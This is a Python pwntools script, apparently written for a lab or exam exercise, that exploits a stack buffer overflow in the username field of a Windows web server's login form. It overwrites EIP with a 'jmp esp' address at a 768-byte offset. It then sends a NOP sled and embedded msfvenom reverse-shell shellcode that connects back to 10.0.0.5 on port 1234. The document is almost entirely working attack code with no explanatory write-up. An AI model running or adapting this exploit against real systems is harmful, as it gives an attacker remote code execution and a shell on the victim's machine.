from pwn import *
import pwn

server = b'10.0.0.4'
bad_chars = b'\x00\x0a\x0d\x25\x26\x2b\x3d'
#--------------------------------------------------------------------------------------------------------
# return a list of all chars from 00-ff with the global bad_chars list filtered out if filter = True
#
def all_chars(filter):
    global bad_chars
    all = b''
    for i in range(0x00,0x100):
        b = i.to_bytes(1, 'little')
        if (filter):
            if (b not in bad_chars):
                all += b
        else:
            all += b
    return all

#---------------------------------------------------------------------------------------------------------
# $ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.5 LPORT=1234 EXITFUNC=thread -b '\x00\x0a\x0d\x25\x26\x2b\x3d' -f python -v shell -a x86 --platform windows 
#   Payload size: 351 bytes
#
def reverse_shell():
    shell =  b""
    shell += b"\xdd\xc6\xd9\x74\x24\xf4\x58\xba\xbf\x97\xbd\x98"
    shell += b"\x29\xc9\xb1\x52\x31\x50\x17\x83\xe8\xfc\x03\xef"
    shell += b"\x84\x5f\x6d\xf3\x43\x1d\x8e\x0b\x94\x42\x06\xee"
    shell += b"\xa5\x42\x7c\x7b\x95\x72\xf6\x29\x1a\xf8\x5a\xd9"
    shell += b"\xa9\x8c\x72\xee\x1a\x3a\xa5\xc1\x9b\x17\x95\x40"
    shell += b"\x18\x6a\xca\xa2\x21\xa5\x1f\xa3\x66\xd8\xd2\xf1"
    shell += b"\x3f\x96\x41\xe5\x34\xe2\x59\x8e\x07\xe2\xd9\x73"
    shell += b"\xdf\x05\xcb\x22\x6b\x5c\xcb\xc5\xb8\xd4\x42\xdd"
    shell += b"\xdd\xd1\x1d\x56\x15\xad\x9f\xbe\x67\x4e\x33\xff"
    shell += b"\x47\xbd\x4d\x38\x6f\x5e\x38\x30\x93\xe3\x3b\x87"
    shell += b"\xe9\x3f\xc9\x13\x49\xcb\x69\xff\x6b\x18\xef\x74"
    shell += b"\x67\xd5\x7b\xd2\x64\xe8\xa8\x69\x90\x61\x4f\xbd"
    shell += b"\x10\x31\x74\x19\x78\xe1\x15\x38\x24\x44\x29\x5a"
    shell += b"\x87\x39\x8f\x11\x2a\x2d\xa2\x78\x23\x82\x8f\x82"
    shell += b"\xb3\x8c\x98\xf1\x81\x13\x33\x9d\xa9\xdc\x9d\x5a"
    shell += b"\xcd\xf6\x5a\xf4\x30\xf9\x9a\xdd\xf6\xad\xca\x75"
    shell += b"\xde\xcd\x80\x85\xdf\x1b\x06\xd5\x4f\xf4\xe7\x85"
    shell += b"\x2f\xa4\x8f\xcf\xbf\x9b\xb0\xf0\x15\xb4\x5b\x0b"
    shell += b"\xfe\xb1\x9b\x13\xfb\xad\x99\x13\x07\xfc\x17\xf5"
    shell += b"\x6d\x10\x7e\xae\x19\x89\xdb\x24\xbb\x56\xf6\x41"
    shell += b"\xfb\xdd\xf5\xb6\xb2\x15\x73\xa4\x23\xd6\xce\x96"
    shell += b"\xe2\xe9\xe4\xbe\x69\x7b\x63\x3e\xe7\x60\x3c\x69"
    shell += b"\xa0\x57\x35\xff\x5c\xc1\xef\x1d\x9d\x97\xc8\xa5"
    shell += b"\x7a\x64\xd6\x24\x0e\xd0\xfc\x36\xd6\xd9\xb8\x62"
    shell += b"\x86\x8f\x16\xdc\x60\x66\xd9\xb6\x3a\xd5\xb3\x5e"
    shell += b"\xba\x15\x04\x18\xc3\x73\xf2\xc4\x72\x2a\x43\xfb"
    shell += b"\xbb\xba\x43\x84\xa1\x5a\xab\x5f\x62\x7a\x4e\x75"
    shell += b"\x9f\x13\xd7\x1c\x22\x7e\xe8\xcb\x61\x87\x6b\xf9"
    shell += b"\x19\x7c\x73\x88\x1c\x38\x33\x61\x6d\x51\xd6\x85"
    shell += b"\xc2\x52\xf3"
    return shell

#----------------------------------------------------------
# main function
#
def main():
    eip = pwn.p32(0x10142a2c) #: jmp esp ;  
    eip_offset = 768
    sc = reverse_shell()
    nopsled = b'\x90'*20
    payload = b'username=' + b'A'*eip_offset + eip + nopsled + sc + b'D'*(1200-eip_offset-8-len(nopsled)-len(sc)) + b'&password=foo\r\n'

    header = (
        b'POST /login HTTP/1.1\r\n'
        b'Host: ' + server + b'\r\n'
        b'Content-Length: ' + bytes(str(len(payload)), encoding='ascii') + b'\r\n'
        b'Cache-Control: max-age=0\r\n'
        b'Upgrade-Insecure-Requests: 1\r\n'
        b'Origin: http://' + server + b'\r\n'
        b'Content-Type: application/x-www-form-urlencoded\r\n'
        b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n'
        b'Accept: text/html\r\n'
        b'Referer: http://' + server + b'/login\r\n'
        b'Accept-Encoding: gzip, deflate\r\n'
        b'Accept-Language: en-US,en;q=0.9\r\n'
        b'Connection: close\r\n\r\n'
    )
    
    r = remote(server, 80)
    r.send(header + payload)
    rspn = r.recv(1024, timeout=1)
    print(f'RECV: {rspn}')
    r.close()
    
#-----------------------------------------------------------
#main entry point
#
if __name__ == "__main__":
    main()